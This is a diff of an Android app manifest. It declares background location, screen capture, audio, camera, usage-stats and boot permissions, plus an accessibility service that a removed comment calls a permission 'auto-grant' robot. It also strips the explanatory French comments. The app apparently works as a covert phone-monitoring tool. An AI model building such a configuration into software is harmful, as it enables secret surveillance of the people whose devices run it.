@@ -2,29 +2,18 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools">
 
-    <!-- Permissions de base -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
-    
-    <!-- Permissions GPS Intensif -->
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
-    
-    <!-- Permissions Service & Notification -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
-    
-    <!-- Permissions Capture Écran & Audio -->
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
     <uses-permission android:name="android.permission.CAMERA" />
-    
-    <!-- Permission Critique : Voir les vraies apps utilisées -->
     <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" tools:ignore="ProtectedPermissions" />
-    
-    <!-- Permission Démarrage Auto (Boot) -->
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
 
     <application
@@ -33,32 +22,19 @@
         android:supportsRtl="true"
         android:theme="@style/Theme.MaterialComponents.Light.NoActionBar">
 
-        <!-- Activité Principale -->
-        <activity
-            android:name=".MainActivity"
-            android:exported="true">
+        <activity android:name=".MainActivity" android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
 
-        <!-- Activité d'Association -->
         <activity android:name=".PairingActivity" />
 
-        <!-- Service GPS & Rapports (SyncWorker) -->
-        <service
-            android:name=".services.SyncWorker"
-            android:foregroundServiceType="location"
-            android:exported="false" />
+        <service android:name=".services.SyncWorker" android:foregroundServiceType="location" android:exported="false" />
+        <service android:name=".services.LocationService" android:foregroundServiceType="location" android:exported="false" />
+        <service android:name=".services.ScreenCaptureService" android:foregroundServiceType="mediaProjection" android:exported="false" />
 
-        <!-- Service Capture Écran (ScreenCaptureService) -->
-        <service
-            android:name=".services.ScreenCaptureService"
-            android:foregroundServiceType="mediaProjection"
-            android:exported="false" />
-
-        <!-- ROBOT AUTO-GRANT (Accessibilité) -->
         <service
             android:name=".services.AutoGrantService"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
@@ -71,11 +47,7 @@
                 android:resource="@xml/accessibility_service_config" />
         </service>
 
-        <!-- RECEVEUR DE DÉMARRAGE (BootReceiver) -->
-        <receiver
-            android:name=".BootReceiver"
-            android:enabled="true"
-            android:exported="true">
+        <receiver android:name=".BootReceiver" android:enabled="true" android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
                 <action android:name="android.intent.action.QUICKBOOT_POWERON" />
